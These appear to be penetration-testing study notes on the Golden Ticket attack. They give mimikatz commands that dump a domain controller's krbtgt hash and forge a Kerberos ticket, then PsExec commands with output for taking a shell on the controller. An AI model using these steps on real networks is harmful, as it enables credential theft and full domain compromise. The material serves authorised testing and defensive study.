# Golden Tickets

Full domain compromise. It is advised to obtain explicit permission from the client before executing this attack due to it's severity

## Explanation

Occurs when we've obtained the NTLM hash of the `krbtgt` account in a domain.

We first need to login to the DC on an administrative account and pull the `krbtgt` hash with `mimikatz`

```
privilege::debug
lsadump::lsa /patch
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

We use the `/patch` parameter to include the `krbtgt` hash in the output of `lsadump::lsa` as it is likely normally hidden due to it's sensitivity.

`kerberos::purge` is also included to avoid conflicting tickets during future command execution.

We can now move laterally in our new command prompt with PsExec

```
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


C:\Windows\system32>
```

Note that if we used the IP address of the domain controller instead of the hostname in our PsExec command, we would instead force NTLM authentication and access would still be blocked

```
C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access 192.168.50.70:
Access is denied.
```
